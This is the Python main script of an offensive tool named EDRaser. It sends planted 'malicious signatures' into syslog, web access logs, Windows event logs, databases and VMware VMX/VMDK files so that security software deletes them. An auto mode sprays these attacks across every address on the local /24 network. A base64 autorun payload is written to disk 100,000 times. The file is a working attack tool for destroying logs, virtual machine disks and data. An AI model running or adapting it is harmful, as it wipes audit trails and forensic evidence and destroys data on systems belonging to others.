import os
import sys
import argparse
import requests
import base64
import threading
import platform
import logging
from EDRaser_logger import init_logger
from signatures import *
from utils import *
from database import *

from website_db import run_web_server

if platform.system() == 'Windows':
    from event_log import run_remote_security_event_log_deletion, run_local_application_event_log_attack

LIST_OF_ATTACKS = ['vmx', 'vmdk', 'windows_security_event_log_remote',
                   'windows_application_event_log_local', 'syslog', 
                   'access_logs', 'remote_db', 'local_db', 'remote_db_webserver']

signature_DB = None

def run_syslog_attack():
    """
    Deletes the /var/log/syslog file  by inseting to it malicious signatures
    """

    logging.info("Running syslog attack")
    for signature in signature_DB:
        run_process("logger", signature.get_signature_data())

def run_auto_mode():
    """
        Trying to run all attacks that are possible without any parameters.
        the attacks that are been executed are:
        access_logs_attack -            on all computers in the C section of the local network.
        remote_security_event_log -     on all computers in the C section of the local network.
        local_application_log_attack -  on the current machine, in case of running under Windows.
        syslog_attack -                 on the current machine, in case of running under Linux.
        VMDK + VMX attacks -            on the current machine, in case of running under VMware.
    """

    IP_CLASS_LENGTH = 256
    C_CLASS_IDX = 3

    host_ip = get_host_ip().split('.')
    threads = []

    # Sending packets all over the network
    for i in range(IP_CLASS_LENGTH):
        host_ip[C_CLASS_IDX] = str(i)
        current_ip = ".".join(host_ip)

        t = threading.Thread(target=run_access_logs_attack, args=(current_ip,))
        threads.append(t)
        t.start()

        t = threading.Thread(
            target=run_remote_security_event_log_deletion, args=(signature_DB, current_ip,))
        threads.append(t)
        t.start()

    if platform.system() == "Windows":
        run_local_application_event_log_attack()
    else:
        run_syslog_attack()

    for t in threads:
        t.join()

    if is_running_under_VMware():
        logging.info("Running VM attacks")
        run_VMDK_attack()
        run_VMX_attack()

def run_access_logs_attack(ip: str, port: int = 80, log_insertion: int = 10):
    """
    Deletes the access logs in the given web server by sending a GET request with malicous user-agent
    
    :param ip: The IP address of the web server.
    :param port: The port number the web server, defualt = 80
    :param log_insertion: The amount of times send the request to the web server, defualt = 10
    """

    logging.info("Running remote access-logs attack")
    for signature in signature_DB:
        for _ in range(log_insertion):
            try:
                requests.get(
                    f"http://{ip}/", headers={'User-Agent': signature.get_signature_data()}, timeout=1)
            
            except ValueError:
                pass
            except Exception as e:
                logging.error(f"Failed to coonect to {ip}:{port}\n{type(e).__name__}")
                return

def run_VMDK_attack():
    """
    Deletes the VMDK files on the host machine, this function should be run inside the guest machine
    it's done be writing to disk a malicous file, the file will be written to the VMDK files at the host machine, and will be deleted there.
    
    Note: if the VMDK files are encerypted, this method won't work.
    """
    if not is_running_under_VMware():
        logging.error("VMDK attack should be run under VMware guest machine")
        return

    logging.info("Running VMDK attack")
    MALICOUS_FILE = "W2F1dG9ydW5dDQpzaGVsbGV4ZWN1dGU9eTMyNHNlZHguZXhlDQppY29uPSVTeXN0ZW1Sb290JVxzeXN0ZW0zMlxTSEVMTDMyLmRsbCw0DQphY3Rpb249T3BlbiBmb2xkZXIgdG8gdmlldyBmaWxlcw0Kc2hlbGxcZGVmYXVsdD1PcGVuDQpzaGVsbFxkZWZhdWx0XGNvbW1hbmQ9eTMyNHNlZHguZXhlDQpzaGVsbD1kZWZhdWx0"
    i =0 
    for k in range(100_000):
        with open(f"test_file_{i}_{k}", 'wb') as test_file:
            test_file.write(base64.b64decode(MALICOUS_FILE))

def run_VMX_attack(path_to_rpctools: str):
    """
    We set a global variable named "guestinfo.detailed.data" as a malicous value.
    This will cause the value to be set on the host machine, therefore the VMX file on the host machine will be deleted.

    :param path_to_rpctools: The path to the VMware rpctools.

    """

    if not is_running_under_VMware():
        logging.error("VMX attack should be run under VMware guest machine")
        return

    logging.info("Running VMX attack (note that if the VMX is encrypted, this won't work)")
    if path_to_rpctools is None:
        if platform.system() == "Windows":
            path_to_rpctools = r"C:\Program Files\VMware\VMware Tools\rpctool.exe"
        else:
            path_to_rpctools = r"/usr/bin/vmware-rpctool"

        logging.error(f"rpc_tools path was not provided, trying default location: '{path_to_rpctools}'")

        if not os.path.exists(path_to_rpctools):
            logging.error(f"'{path_to_rpctools}' not exists, please provide rpc-tool location")
            return

    for signature in signature_DB:
        run_process(path_to_rpctools, f"info-set guestinfo.detailed.data {signature.get_signature_data()}")

def parse_args():
    """
    Parsing user arguments
    """

    parser = argparse.ArgumentParser(description='EDRaser tool description')

    parser.add_argument(
        '-auto', help='Automatically scan the curernt C LAN network and perform every possible attack')
    parser.add_argument(
        '-sigfile', help='A Path to the encrypted signatures file')
    
    parser.add_argument(
        '-ip', help='A IP address for remote attack (default: localhost)')
    parser.add_argument(
        '-port', help='Port number for remote connection to DB / WebServer / EventLog')
    
    parser.add_argument(
        '-db_username', help='A username for remote connection to database (used in remote_db_attack)')
    parser.add_argument(
        '-db_password', help='A password for remote connection to database (used in remote_db_attack)')
    parser.add_argument(
        '-db_type', help=f"A type of DB for db_attacks, supported DB's: {SUPPORTED_DBs}")
    parser.add_argument(
        '-db_name', help=f"The name of the DB to insert the malicous strings into (default: {SAMPLE_DB_NAME})")
    parser.add_argument(
        '-table_name', help=f"The name of the table to insert the malicous strings into (default: {SAMPLE_TABLE_NAME})")

    parser.add_argument(
        '-rpc_tools', help=f'Specify the path to the rpc_tools executable')
    parser.add_argument(
        '-attack', help=f'Specify the attack to be executed, Available attacks: {LIST_OF_ATTACKS}')

    return parser.parse_args()

def main():
    global signature_DB
    init_logger()

    if len(sys.argv) < 2:
        logging.error("Please provide at least 1 argument, use --help flag for help")
        exit()

    args = parse_args()
    signature_DB = load_malicous_signatureDB(args.sigfile or "evilSignatures.db")
    logging.info("EvilSignatures DB loaded!")

    if args.auto:
        run_auto_mode()
        exit(0)
    
    if args.attack:
        if args.attack not in LIST_OF_ATTACKS:
            logging.error(f"Attack not exists, list of attacks:\n{LIST_OF_ATTACKS}")
            exit(0)


        if args.attack == "windows_application_event_log_local":
            run_local_application_event_log_attack()

        elif args.attack == "windows_security_event_log_remote":
            if not args.ip:
                logging.error("You need to provide IP address for this attack")
                exit(0)
            run_remote_security_event_log_deletion(signature_DB, args.ip)

        elif args.attack == "local_db":
            run_local_database_attack(args.db_name, args.table_name, signature_DB)

        elif args.attack == 'syslog':
            run_syslog_attack()

        elif args.attack == "vmx":
            run_VMX_attack(args.rpc_tools)
        

        elif args.attack == "access_logs":
            if args.ip:
                run_access_logs_attack(args.ip)
            else:
                logging.error("Please provide IP for this attack")

        elif args.attack == "vmdk":
            run_VMDK_attack()

        elif args.attack == "remote_db":
            if all([args.db_type, args.db_username, args.db_password, args.ip]):
                run_remote_database_attack(signature_DB,
                                           args.db_type, 
                                           args.db_username, 
                                           args.db_password, 
                                           args.ip, 
                                           args.port or 3306,
                                           args.db_name,
                                           args.table_name)

            else:
                logging.error("Please specify db_type, username, password in order to execute remote_db_attack")
                logging.info("Example:")
                logging.info("EDRaser.py -attack remote_db -db_type mysql -db_username test_user -db_password test_password -ip 192.168.1.10")

        elif args.attack == "remote_db_webserver":
            if all([args.db_type, args.db_username, args.db_password, args.ip]):
                run_web_server(args.ip,
                                args.db_type,
                                args.port or 3306,
                                args.db_username,
                                args.db_password,
                                args.table_name)
            else:
                logging.error("Please specify db_type, username, password in order to execute run_web_server")
                logging.error("These deatiled should be for the DB server")
                logging.info("Example:")
                logging.info("EDRaser.py -attack remote_db_webserver -db_type mysql -db_username test_user -db_password test_password -ip 192.168.1.10")


if __name__ == "__main__":
    main()
